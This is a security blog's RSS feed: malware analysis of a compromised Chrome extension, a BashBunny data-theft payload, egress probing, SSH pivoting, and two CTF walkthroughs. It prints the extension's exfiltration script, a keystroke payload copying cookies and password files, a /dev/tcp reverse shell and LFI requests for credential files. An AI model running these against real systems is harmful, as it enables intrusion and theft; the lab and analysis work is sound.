<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>SecBlog</title>
    <link>https://sec.alexflor.es/index.xml</link>
    <description>Recent content on SecBlog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>Untitled.</copyright>
    <lastBuildDate>Thu, 03 Aug 2017 20:59:56 -0400</lastBuildDate>
    <atom:link href="https://sec.alexflor.es/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>Chrome Extension Steals Cloudflare Api Tokens</title>
      <link>https://sec.alexflor.es/post/chrome-extension-steals-cloudflare-api-tokens/</link>
      <pubDate>Thu, 03 Aug 2017 20:59:56 -0400</pubDate>
      
      <guid>https://sec.alexflor.es/post/chrome-extension-steals-cloudflare-api-tokens/</guid>
      <description>

&lt;p&gt;Upon receiving news that the popular Chrome Extension, Web Developer, had been compromised, I
quickly began to wonder about the what and how. Several stories exist about how the extension came
to be compromised and they touched a bit on what it did. This post is meant to expand upon, what I
believe to be, the more nefarious behavior of the extension. Since the extension calls out to an
attacker-controlled URL, the payload hosted at that URL could be changed to &lt;em&gt;anything&lt;/em&gt; at any time.&lt;/p&gt;

&lt;p&gt;At the time of inspection, the code checks to see if the victim is on the Cloudflare domain. If it
is, it starts an XHR request to fetch the users&amp;rsquo; API token and ships it, along with the victim&amp;rsquo;s
email address, to an attacker-controlled server.&lt;/p&gt;

&lt;h2 id=&#34;the-code&#34;&gt;The Code&lt;/h2&gt;

&lt;p&gt;The extension contains code that, upon visiting any site, generates a dynamic URL that changes
daily. It uses an MD5 hash of the current date, using the d-m-yyyy format.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;// tomorrow&#39;s url
https://wd + md5(4-8-2017) + .win/ga.js
https://wdfefe6195a8b014a1cc7d9cf2449d1b50.win/ga.js
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The following payload is fetched on every page that a victim navigates to. The payload is encoded and
minified. Expanding it reveals the following portion:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-javascript.prettyprint&#34;&gt;if (top[&#39;location&#39;][&#39;href&#39;][&#39;indexOf&#39;](&#39;cloudflare.com&#39;) &amp;gt; -1) {
  (function () {
    var _0xb2b9x1 = document[&#39;createElement&#39;](&#39;script&#39;);
    _0xb2b9x1[&#39;type&#39;] = &#39;text/javascript&#39;;
    _0xb2b9x1[&#39;src&#39;] = &#39;//searchtab.win/ga.js&#39;;
    var _0xb2b9x2 = document[&#39;getElementsByTagName&#39;](&#39;script&#39;)[0];
    _0xb2b9x2[&#39;parentNode&#39;][&#39;insertBefore&#39;](_0xb2b9x1, _0xb2b9x2)
  })()
} else {...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The first-stage payload checks whether the victim is currently on cloudflare.com. If they are, it
creates a new script tag on the page and sets its source to &lt;code&gt;//searchtab.win/ga.js&lt;/code&gt;. This downloads
stage 2 of the payload. If we look, we get the following script:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-javascript.prettyprint&#34;&gt;var xmlhttp = new XMLHttpRequest();
xmlhttp.open(&#39;GET&#39;, &#39;https://www.cloudflare.com/api/v4/user/api_key&#39;, true);
xmlhttp.setRequestHeader(&amp;quot;x-atok&amp;quot;, window.bootstrap.atok);
xmlhttp.onreadystatechange = function() {
  if (xmlhttp.readyState == 4) {
    if(xmlhttp.status == 200) {
      var obj = JSON.parse(xmlhttp.responseText);
      var key = obj.result.api_key;
      console.log(key);
      (new Image).src = &#39;//searchtab.win/ga.php?user=&#39; +
        encodeURIComponent(window.bootstrap.data.user.email) + &#39;&amp;amp;key=&#39; + encodeURIComponent(key);
    }
  }
};
xmlhttp.send(null);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This second-stage payload &lt;code&gt;GET&lt;/code&gt;s the logged in user&amp;rsquo;s API key then sends it, and the user&amp;rsquo;s email,
along to the &lt;code&gt;searchtab.win&lt;/code&gt; domain.&lt;/p&gt;

&lt;p&gt;This was clearly a targeted attack against professional Web Developers. Web Developers will
sometimes have access to production accounts on their employer&amp;rsquo;s infrastructure. Though more common
in smaller companies that don&amp;rsquo;t have dedicated DevOps and/or Security teams, it&amp;rsquo;s not impossible
for bigger companies to fall prey.&lt;/p&gt;

&lt;p&gt;With a valid API token, attackers could control a company&amp;rsquo;s public-facing infrastructure and
create or modify sub/domains.&lt;/p&gt;

&lt;p&gt;We&amp;rsquo;ve currently blocked all outgoing requests to &lt;code&gt;*.win/ga.js&lt;/code&gt; and asked our developers to update
to version 0.5 of the Web Developer extension.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Creating BashBunny Payloads</title>
      <link>https://sec.alexflor.es/post/bashbunny/</link>
      <pubDate>Sat, 01 Apr 2017 22:08:35 -0400</pubDate>
      
      <guid>https://sec.alexflor.es/post/bashbunny/</guid>
      <description>

&lt;h2 id=&#34;what-is-it&#34;&gt;What is it?&lt;/h2&gt;

&lt;p&gt;The &lt;a href=&#34;http://wiki.bashbunny.com/#!index.md&#34;&gt;BashBunny&lt;/a&gt; is an attack platform that allows attackers to
create payloads in Bash. The device can be scripted to enumerate as a HID (keyboard), mass storage,
serial, and Ethernet. This enables a multitude of attacks including thing like exfiltrating
documents over a network interface or stealing account hashes from locked computers.&lt;/p&gt;

&lt;h2 id=&#34;creating-a-payload&#34;&gt;Creating a Payload&lt;/h2&gt;

&lt;p&gt;We want to create a payload that allows for easy exfiltration from macOS. We also don&amp;rsquo;t want to
force the attacker to know the exact path of the files that are to be extracted; we should allow them
to create bash commands whose output returns a list of files that are to be exfilled.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash.prettyprint&#34;&gt;
# here we set an amber color to the LED so that the 
# attacker knows that the payload has begun executing
LED G R 500

# instruct the BashBunny to enumerate as both a keyboard and
# mass storage on the host computer (masOS)
ATTACKMODE HID STORAGE

# this creates a folder in the BashBunny&#39;s loot directory
# that will be used by our payload
mkdir -p /root/udisk/loot/sMacAndGrab

# enter the name of the volume that will be mounted
dev_name=&amp;quot;BASHBUNNY&amp;quot;

# this is a variable that holds the path to which we will instruct
# the target to copy our desired files
lootdir=&amp;quot;\&amp;quot;/Volumes/$dev_name/loot/sMacAndGrab\&amp;quot;&amp;quot;

# in this section, we add files, directories, and unix commands
# which return lists of files. this text will be typed exactly
# in the macOS terminal. Because this is bash, we have to escape 
# bash characters so that they don&#39;t evaluate when the script runs, 
# but rather they&#39;re seen as simple text.
files_to_copy=(
&amp;quot;\&amp;quot;~/Library/Application Support/Google/Chrome/Default/Cookies\&amp;quot;&amp;quot; # Quote paths with spaces
&amp;quot;~/Dropbox&amp;quot;  # enter entire directories
&amp;quot;\$(grep -lr password ~/Documents)&amp;quot; # get all Documents with the word &#39;password&#39;
)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;It&amp;rsquo;s important to remember that this is a bash script and if we don&amp;rsquo;t want symbols like &lt;code&gt;$;|:~&lt;/code&gt; to
be evaluated, but rather typed or passed to the victim, they must be escaped with a backslash.&lt;/p&gt;

&lt;p&gt;In the second half of the payload, we&amp;rsquo;re defining strings that are going to by typed by the
BashBunny on the victim computer. This is why you&amp;rsquo;ll see it peppered with &lt;code&gt;\\&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash.prettyprint&#34;&gt;
# these command instruct the BashBunny to act as a keyboard and physically
# type the commands

# Command + Space to launch Spotlight
QUACK GUI SPACE
QUACK DELAY 1000

# Opens the Terminal program
QUACK STRING terminal
QUACK ENTER
QUACK DELAY 4000

# Types a command to compress all of the previously defined files to 
# the previously defined storage location
QUACK STRING tar -cf \$USER.tar.gz ${files_to_copy[*]}\; mv \$USER.tar.gz $lootdir\; killall Terminal
# $lootdir and $files_to_copy are not escaped because we want them expanded to the variables we set
QUACK ENTER

# sync the filesystem to the BashBunny can be safely removed
sync

# let the attacker know that they can remove the BashBunny
LED G
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And that&amp;rsquo;s that. If one follows the directions in the wiki posted at the beginning of this post for
loading this payload, you have a payload that creates automatic involuntary backups in a matter of
seconds.&lt;/p&gt;

&lt;p&gt;I&amp;rsquo;ve submitted the code to the official &lt;a href=&#34;https://github.com/hak5/bashbunny-payloads/tree/master/payloads/library/SmacAndGrab&#34;&gt;Hak5 BashBunny Payload&lt;/a&gt;
repo as the payload sMacAndGrab. Enjoy!&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Finding Your Way Out From Behind Firewalls with Strict Outbound Rules</title>
      <link>https://sec.alexflor.es/post/egress-ports/</link>
      <pubDate>Tue, 07 Feb 2017 19:44:18 -0500</pubDate>
      
      <guid>https://sec.alexflor.es/post/egress-ports/</guid>
      <description>

&lt;p&gt;You&amp;rsquo;ve achieved code execution on a machine, but for some reason your reverse shell isn&amp;rsquo;t pinging you back.
Or that wget/tftp command isn&amp;rsquo;t downloading your recon/post-exploitation tools. There&amp;rsquo;s a chance you&amp;rsquo;re
dealing with an egress problem. Typical ports that need outboud access are blocked. You try the main ones
you can think of (21, 22, 53, 80, 8080, 443), but none of them seem to be connecting. Do you start at 1 and
manually test? NO! The hallmarks of any decent programmer/hacker is laziness. So let&amp;rsquo;s get lazy.&lt;/p&gt;

&lt;h2 id=&#34;the-concept&#34;&gt;The Concept&lt;/h2&gt;

&lt;p&gt;There&amp;rsquo;s a few methods to achieve this, but at each of their cores, these 2 things are happening.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;The attacking machine (66.66.66.66) needs to listen for something on every port.&lt;/li&gt;
&lt;li&gt;Your victim machine (23.23.23.23.) needs to try to hit your machine on every port.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;netcat-and-iptables&#34;&gt;netcat and iptables&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;For the attacker&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Set all ports to redirect to a listener you&amp;rsquo;ve started.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash.prettyprint&#34;&gt;iface=eth0
ip=66.66.66.66
lport=8080

iptables -t nat -A PREROUTING -i $iface -p tcp --dport 1:65535 -j DNAT --to-destination $ip:$lport
nc -nvlp $lport
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;For the victim machine&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;*nix:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash.prettyprint&#34;&gt;for port in (1..1000); do
  echo &amp;quot;Trying $port&amp;quot;
  nc -z -w1 66.66.66.66 $port
done
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Netcat DOES accept ranges, so the following also works: &lt;code&gt;nc -w1 66.66.66.66 1-1000&lt;/code&gt;. I usually find
that the bash loop&amp;rsquo;s logging makes it easier to ID what worked if you walk away for a bit while it
runs.&lt;/p&gt;

&lt;h3 id=&#34;wireshark&#34;&gt;wireshark&lt;/h3&gt;

&lt;p&gt;If you have a GUI available on the attacking machine, you can repeat the above scenario, but
substitute the iptables and nc commands for wireshark with a sane filter; something like&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash.prettyprint&#34;&gt;ip.src == 23.23.23.23
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;You should be able to watch the window for incoming packets and determine on which port
the victim machine was able to connect.&lt;/p&gt;

&lt;h3 id=&#34;egress-buster&#34;&gt;egress-buster&lt;/h3&gt;

&lt;p&gt;If you&amp;rsquo;ve the ability to get files onto the target machine, the most robust option is
&lt;a href=&#34;https://github.com/trustedsec/egressbuster&#34;&gt;egress-buster&lt;/a&gt;. The readme does a great job explaining
usage, but it&amp;rsquo;s basically the first method, using iptables and python. It consists of two scripts,
a client and a server. It also has an option to automatically start the reverse shell once it finds
an available outgoing part.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Configuring SSH for Pivoting</title>
      <link>https://sec.alexflor.es/post/ssh_pivoting/</link>
      <pubDate>Thu, 02 Feb 2017 16:32:04 -0500</pubDate>
      
      <guid>https://sec.alexflor.es/post/ssh_pivoting/</guid>
      <description>

&lt;p&gt;You&amp;rsquo;re on a pentesting engagement and you&amp;rsquo;ve discovered a dual homed machine that allows you access to a subnet
you can&amp;rsquo;t access directly from your attack machine. Assuming you&amp;rsquo;ve compromised at least one machine on the
initial network, you can use it as a proxy to other machines on the &amp;ldquo;hidden&amp;rdquo; subnet.&lt;/p&gt;

&lt;p&gt;The ssh client has an often-overlooked configuration file that resides in your &lt;code&gt;~/.ssh&lt;/code&gt; folder. You can
configure things in here that are specific to certain hosts or you can set default configurations for every
host. In order to access remote networks, wouldn&amp;rsquo;t it be nice to shorten a command like:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash.prettyprint&#34;&gt;ssh -l user -L 127.0.0.1:5432:132.31.321.123:5432 -p 20222 -i ~/.ssh/db/id_rsa remote.server.com
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;to something like:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash.prettyprint&#34;&gt;ssh mount_psql
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;ssh-config-file&#34;&gt;SSH Config file&lt;/h3&gt;

&lt;p&gt;This file has a &lt;em&gt;lot&lt;/em&gt; of configuration options, but we&amp;rsquo;re just going to focus on the one&amp;rsquo;s that help us
pivot through 2+ networks.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;ControlMaster&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Enables the sharing of multiple sessions over a single network connection. 
When set to &#39;&#39;yes&#39;&#39;, ssh(1) will listen for connections on a control socket 
specified using the ControlPath argument. Additional sessions can connect 
to this socket using the same ControlPath
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;ControlPath&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Specify the path to the control socket used for connection sharing as described 
in the ControlMaster section above or the string &#39;&#39;none&#39;&#39; to disable connection 
sharing
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;ProxyCommand&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Specifies the command to use to connect to the server. The command string extends 
to the end of the line, and is executed with the user&#39;s shell. In the command 
string, &#39;%h&#39; will be substituted by the host name to connect and &#39;%p&#39; by the port.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ok, so the first two aren&amp;rsquo;t strictly necessary for the pivoting, but subsequent connections to the same host
will just reuse the same authenticated socket, so it&amp;rsquo;s lighting fast.&lt;/p&gt;

&lt;p&gt;If you have the passwords for all the machines in your pivot chain, the client should ask you for each of
them, but the whole process is much smoother if you upload keys to each of them. The cool thing about the ssh
config file is that any program that uses ssh on the backend, can also use this file. So if you configure a
server entry called &lt;code&gt;skynet&lt;/code&gt;&amp;hellip;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash.prettyprint&#34;&gt;ssh skynet
scp file.txt skynet:/tmp
rsync -avr skynet ...
ssh-copy-id -i ~/.ssh/id_rsa skynet
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;^ All of those work.&lt;/p&gt;

&lt;p&gt;So let&amp;rsquo;s configure our &lt;code&gt;~/.ssh/config&lt;/code&gt; file. Let&amp;rsquo;s also assume root login is enabled on all the machines and
that we&amp;rsquo;ve already copied our ssh keys onto the remote machines.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash.prettyprint&#34;&gt;ControlMaster auto
ControlPath /tmp/ssh_mux_%h_%p_%r
ServerAliveInterval 60 

Host first_hop
  Hostname 123.123.321.123
  User root
  IdentityFile ~/.ssh/id_rsa

Host second_hop
  Hostname 321.321.345.345
  User root
  IdentityFile ~/.ssh/id_rsa
  ProxyCommand ssh -w %h:%p first_hop

Host skynet
  Hostname 666.666.666.666
  User root
  IdentityFile ~/.ssh/id_rsa
  ProxyCommand ssh -w %h:%p second_hop
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;With this configuration, we&amp;rsquo;re able to connect to &lt;code&gt;skynet&lt;/code&gt;, which is 2 subnets removed from our current one,
with the command &lt;code&gt;ssh skynet&lt;/code&gt;. Likewise, if we want to create a dynamic tunnel to allow for &lt;code&gt;proxychains&lt;/code&gt;
usage, &lt;code&gt;ssh -fNTD 9050 skynet&lt;/code&gt; should do the trick. Then &lt;code&gt;proxychains nmap...&lt;/code&gt; to your hearts content!&lt;/p&gt;

&lt;p&gt;The ProxyCommand directive in &lt;code&gt;skynet&lt;/code&gt; is, in a way, declaring a prerequisite ssh connection to &lt;code&gt;second_hop&lt;/code&gt;.
The &lt;code&gt;-w&lt;/code&gt; flag states that the client should just go ahead and forward and STDIN/OUT through the next
connection.&lt;/p&gt;

&lt;p&gt;That&amp;rsquo;s it. Go forth and PIVAAAT!&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://az616578.vo.msecnd.net/files/2016/07/16/636042357012300047-1231186684_ross-pivot-friends.gif&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Additional Resources:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://linux.die.net/man/5/ssh_config&#34;&gt;SSH Client Configurations Docs&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>B2R: Wallaby Walkthrough</title>
      <link>https://sec.alexflor.es/post/wallaby/</link>
      <pubDate>Fri, 30 Dec 2016 19:16:02 -0400</pubDate>
      
      <guid>https://sec.alexflor.es/post/wallaby/</guid>
      <description>

&lt;h2 id=&#34;executive-summary&#34;&gt;Executive Summary&lt;/h2&gt;

&lt;p&gt;This machine had an unlisted but open webapp path that allowed for remote command execution. After
establishing a reverse shell as the limited user &lt;code&gt;www-data&lt;/code&gt;, privilege checks showed the user was allowed to
modify firewall rules. There was also an IRC server that contained a bot that allowed command execution
through the use of the &lt;code&gt;.run&lt;/code&gt; command. The command would only obey the user &lt;code&gt;waldo&lt;/code&gt; so modification of the
firewall allows an attacker to kick and assume the &lt;code&gt;waldo&lt;/code&gt; identity. Now the &lt;code&gt;.run&lt;/code&gt; command could be run and
a reverse shell with the user &lt;code&gt;wallaby&lt;/code&gt; could be established. &lt;code&gt;wallaby&lt;/code&gt; had password-less sudo access, so
elevating to the root user was trivial.&lt;/p&gt;

&lt;h2 id=&#34;tools-used&#34;&gt;Tools Used&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;nmap - service enumeration&lt;/li&gt;
&lt;li&gt;uniscan - webapp scanner&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;proof-of-concept&#34;&gt;Proof of Concept&lt;/h2&gt;

&lt;p&gt;Upon enumerating available services with nmap, I discovered two ports, 22 and 80. I began to scan with
&lt;code&gt;uniscan&lt;/code&gt; but this failed and caused the VM to move the web application to a different port. It appeared that
automated tools were going to make this challenge harder, not easier.&lt;/p&gt;

&lt;p&gt;After another scan, we find our new port:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/U7eKOCh.png&#34; alt=&#34;&#34; /&gt;
&lt;img src=&#34;https://i.imgur.com/xuPADKd.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Various sorts of manual testing gave us different messages:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/WwMxNnj.png&#34; alt=&#34;&#34; /&gt;
&lt;img src=&#34;https://i.imgur.com/IS2BlBh.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;At this point, I decided to automate my enumeration of pages with a custom script.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash.prettyprint&#34;&gt;for word in $(cat /usr/share/dirb/wordlists/common.txt); do
    
    # find pages whose last line does NOT contain the phrase &#39;what are you trying&#39; ( a 404, essentially )
    curl -q &amp;quot;vm:60080/?page=$word&amp;quot; 2&amp;gt;/dev/null | tail -1 | grep -v &#39;what are you trying&#39;

    if [[ $? -eq 0 ]]; then
        #if the last command command completed succesfully, print the word we foun
        echo $word
    fi
done | grep -v &amp;quot;/&amp;quot; # don&#39;t print results with slashes in them, they&#39;re false positives
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This output yielded the pages.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash.prettyprint&#34;&gt;contact
mailer
home
index
blacklist
name
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The most interesting page here was &lt;code&gt;mailer&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/TNJEtuI.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;I attempted to see if the &lt;code&gt;mail&lt;/code&gt; query parameter actually passed through as a system command. It did:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/9Yu6Zky.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;From here we can set up a listener and run a reverse shell by feeding in url encoded commands to the &lt;code&gt;mail&lt;/code&gt;
query parameter:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash.prettyprint&#34;&gt;bash -c &amp;quot;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.1.177/443 0&amp;gt;&amp;amp;1&amp;quot;

# becomes

bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.177%2F443%200%3E%261%22
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/tWhvBSP.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Enumerating this user&amp;rsquo;s privileges and networking, we determine that we have control of firewall rules,
there&amp;rsquo;s a rule blocking incoming requests to port 6667, and that there&amp;rsquo;s an IRC server running locally.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/1slTkmg.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/uxK21ov.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;We can clear the firewall rules with &lt;code&gt;sudo iptables -F&lt;/code&gt; and connect to the IRC server from the attacking
machine.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/b0NDIKS.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/IoX9DnK.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;If we try to run the &lt;code&gt;.run&lt;/code&gt; command, &lt;code&gt;wallabysbot&lt;/code&gt; refuses.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/R5Vwo3f.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;The code for the and configs for the bot are located in &lt;code&gt;/home/wallaby/.sopel&lt;/code&gt; and it indicates that we need
to assume the nickname &lt;code&gt;waldo&lt;/code&gt; in order for us to be able to use this command. We can&amp;rsquo;t do that while waldo
is still logged in so we boot them off with the use of our firewall.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash.prettyprint&#34;&gt;sudo iptables -I OUTPUT -p tcp -m owner --uid-owner 1000 --dport 6667 -s 127.0.0.1 -j DROP
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/KCH7TX6.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;In a while, after a timeout, only &lt;code&gt;waldo&lt;/code&gt; should be ejected from the room, leaving the ability to steal his
nick and command the bot.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/1TnwYcT.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;With a reverse shell established, we can see that the wallaby user has full, passwordless &lt;code&gt;sudo&lt;/code&gt; access. From
here, it&amp;rsquo;s just one command to &lt;code&gt;root&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/Ds0KVYg.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Thanks to Waldo and Vulnhub for this frustrating but entertaining VM!&lt;/p&gt;

&lt;h2 id=&#34;additional-information&#34;&gt;Additional Information&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;User &lt;code&gt;waldo&lt;/code&gt; is running irssi within a tmux session. The socket is located in &lt;code&gt;/tmp/tmux-1000&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;There exists an irssi DoS vulnerability that could have been used to boot the &lt;code&gt;waldo&lt;/code&gt; user to assume
control of the bot.&lt;/li&gt;
&lt;li&gt;The &lt;code&gt;.py&lt;/code&gt; modules (which runs python commands), at the time of this writing makes an external call to an
out-of-scope API. It does not run the python command on the target machine.&lt;/li&gt;
&lt;li&gt;There are at least 3 ways to get a limited shell and at least 2 to get root.&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>B2R: Stapler</title>
      <link>https://sec.alexflor.es/post/stapler/</link>
      <pubDate>Sat, 24 Dec 2016 23:45:38 -0500</pubDate>
      
      <guid>https://sec.alexflor.es/post/stapler/</guid>
      <description>

&lt;p&gt;Adding the IP address of the VM to the hosts file allows one to cut down on some typing.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/cazlgnf.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;h2 id=&#34;executive-summary&#34;&gt;Executive Summary&lt;/h2&gt;

&lt;p&gt;This machine had several services running, some of which revealed employee names and accounts that could
later be leveraged to compromise the system. A Wordpress plug-in vulnerability was found and used to extract
database credentials, which then led to a non-privileged shell. Once scanned, it was discovered that a script
ran every 20 minutes as the &lt;code&gt;root&lt;/code&gt; user and that the script was writable to our non-privileged user. This was
leveraged to create a &lt;code&gt;root&lt;/code&gt; shell by replacing the file contents with a malicious payload.&lt;/p&gt;

&lt;h2 id=&#34;execution&#34;&gt;Execution&lt;/h2&gt;

&lt;p&gt;An initial recon scan on the target revealed the following services:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash.prettyprint&#34;&gt;&amp;gt;&amp;gt; onetwopunch -t ip_addresses.txt -p tcp
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/YeosV0b.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;All together, individual inspection of the services revealed a plethora of information about the company and
its employees.
This section will cover the most direct route to &lt;code&gt;root&lt;/code&gt;,
but see the &lt;a href=&#34;#additional-discovery&#34;&gt;Additional Discovery&lt;/a&gt; section for that information.&lt;/p&gt;

&lt;p&gt;Using &lt;code&gt;nikto&lt;/code&gt; against the service on port &lt;code&gt;12380&lt;/code&gt; revealed additional paths using the https protocol.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash.prettyprint&#34;&gt;&amp;gt;&amp;gt; nikto -host vm:12380
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/DTF5i00.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;The site hosted at &lt;code&gt;/blogblog&lt;/code&gt; is a Wordpress blog with a vulnerable plug-in, as discovered by &lt;code&gt;wpscan&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash.prettyprint&#34;&gt;wpscan -u https://vm:12380/blogblog/
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/uzdO1dx.png&#34; alt=&#34;&#34; /&gt;
&lt;img src=&#34;https://i.imgur.com/U2NyDnu.png&#34; alt=&#34;&#34; /&gt;
&lt;img src=&#34;https://i.imgur.com/LrEOKFq.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://www.exploit-db.com/exploits/39646/&#34;&gt;This LFI vulnerability&lt;/a&gt; allows an attacker to read the contents
of a file on the system by using that file as a &amp;ldquo;thumbnail&amp;rdquo; for a post. An attacker could use this to read
the contents of the Wordpress configuration file which has database credentials. The user account list for
this machine was also acquired using this method.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash.prettyprint&#34;&gt;&amp;gt;&amp;gt; curl -k &amp;quot;https://vm:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&amp;amp;title=9898092807434134&amp;amp;short=rnd&amp;amp;term=rnd&amp;amp;thumb=../../../../../etc/passwd&amp;quot;
&amp;gt;&amp;gt; curl -k &amp;quot;https://vm:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&amp;amp;title=9898092807434134&amp;amp;short=rnd&amp;amp;term=rnd&amp;amp;thumb=../wp-config.php&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/XMcARrC.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;By curling the &amp;ldquo;image&amp;rdquo; urls, the contents can be read.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/CVtnKiK.png&#34; alt=&#34;&#34; /&gt;
&lt;img src=&#34;https://i.imgur.com/rfez3zi.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;With credentials and an open 3306 port, an attacker can log in and create a malicious file that would allow
remote code execution.&lt;/p&gt;

